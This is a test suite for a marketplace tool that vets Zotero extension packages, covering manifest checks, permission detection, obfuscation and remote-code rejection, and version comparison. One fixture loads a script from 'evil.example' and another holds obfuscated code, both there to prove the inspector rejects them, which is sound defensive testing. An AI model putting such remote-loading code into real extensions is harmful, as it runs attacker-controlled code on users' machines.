import { test } from "node:test";
import assert from "node:assert/strict";
import { inspectXpi } from "../scripts/lib/inspect.mjs";
import { compareVersions, isCompatible } from "../scripts/lib/version.mjs";
import { config, listing, manifest, xpi } from "./helpers.mjs";

const codes = (result, level) => result.findings.filter((f) => !level || f.level === level).map((f) => f.code);

test("a plain extension passes with nothing to report", () => {
  const result = inspectXpi(xpi(), { listing: listing(), config });
  assert.equal(result.ok, true);
  assert.deepEqual(result.findings, []);
  assert.equal(result.version, "1.0.0");
  assert.equal(result.minAppVersion, "9.0");
  assert.equal(result.maxAppVersion, "11.*");
  // The smallest icon of at least 64px.
  assert.equal(result.icon.path, "icon-96.png");
  assert.equal(result.icon.type, "image/png");
});

test("the manifest must match the listing and point updates at the marketplace", () => {
  const result = inspectXpi(
    xpi({ manifest: manifest({ zotero: { id: "other@example.com", update_url: "https://example.com/u.json" } }) }),
    { listing: listing(), config },
  );
  assert.equal(result.ok, false);
  assert.deepEqual(codes(result, "error").sort(), ["id-mismatch", "update-url"]);
});

test("an extension without bootstrap.js or version bounds is rejected", () => {
  const result = inspectXpi(
    xpi({ manifest: manifest({ zotero: { strict_max_version: undefined } }), files: { "bootstrap.js": null } }),
    { listing: listing(), config },
  );
  assert.deepEqual(codes(result, "error").sort(), ["bootstrap-missing", "compat-missing"]);
});

test("code from the internet and obfuscated code are rejected", () => {
  const obfuscated = Array.from({ length: 30 }, (_, i) => `var _0x${(0xa000 + i).toString(16)}=1;`).join("");
  const result = inspectXpi(
    xpi({
      files: {
        "content/load.js": 'Services.scriptloader.loadSubScript("https://evil.example/x.js", this);',
        "content/page.xhtml": '<script src="https://cdn.example/lib.js"></script>',
        "content/o.js": obfuscated,
      },
    }),
    { listing: listing(), config },
  );
  assert.equal(result.ok, false);
  assert.deepEqual(codes(result, "error").sort(), ["obfuscated", "remote-code", "remote-code"]);
});

test("what the code uses is compared with what the listing declares", () => {
  const files = {
    "content/a.js": [
      "Services.cookies.getCookiesFromHost(h, {});",
      "Zotero.Utilities.Internal.copyTextToClipboard(t);",
      'fetch("https://api.example.com/v1");',
      'fetch("https://other.example.net/");',
      'el.setAttribute("xmlns", "http://www.w3.org/1999/xhtml");',
    ].join("\n"),
  };
  const undeclared = inspectXpi(xpi({ files }), { listing: listing(), config });
  assert.equal(undeclared.ok, true);
  assert.deepEqual(undeclared.detected.uses, ["clipboard", "cookies"]);
  assert.deepEqual(undeclared.detected.hosts, ["api.example.com", "other.example.net"]);
  assert.deepEqual(codes(undeclared, "warning").sort(), ["undeclared-clipboard", "undeclared-cookies"]);
  assert.deepEqual(codes(undeclared, "notice"), ["undeclared-hosts"]);

  const declared = inspectXpi(xpi({ files }), {
    listing: listing({ declares: { cookies: true, clipboard: true, network: ["example.com", "example.net"] } }),
    config,
  });
  assert.deepEqual(declared.findings, []);
});

test("sending content without a privacy policy is a warning", () => {
  const result = inspectXpi(xpi(), { listing: listing({ declares: { sendsContent: true } }), config });
  assert.deepEqual(codes(result), ["no-privacy-policy"]);
});

test("a version Paperly would refuse is listed with a warning", () => {
  const result = inspectXpi(xpi({ manifest: manifest({ zotero: { strict_max_version: "10.*" } }) }), {
    listing: listing(),
    config,
  });
  assert.equal(result.ok, true);
  assert.deepEqual(codes(result), ["incompatible"]);
});

test("oversized and broken files are refused before anything else", () => {
  assert.deepEqual(codes(inspectXpi(Buffer.alloc(config.maxXpiBytes + 1), { listing: listing(), config })), [
    "too-large",
  ]);
  assert.deepEqual(codes(inspectXpi(Buffer.from("x".repeat(100)), { listing: listing(), config })), ["not-a-zip"]);
  assert.deepEqual(codes(inspectXpi(xpi({ files: { "manifest.json": "{" } }), { listing: listing(), config })), [
    "manifest-invalid",
  ]);
});

test("versions compare the way the add-on manager compares them", () => {
  assert.equal(compareVersions("1.0", "1.0.0"), 0);
  assert.equal(compareVersions("1.0b2", "1.0"), -1);
  assert.equal(compareVersions("1.10", "1.9"), 1);
  assert.equal(compareVersions("11.0", "11.*"), -1);
  assert.equal(isCompatible("11.0", "9.0", "11.*"), true);
  assert.equal(isCompatible("11.0", "9.0", "10.*"), false);
  assert.equal(isCompatible("11.0", "11.1", "12.*"), false);
});
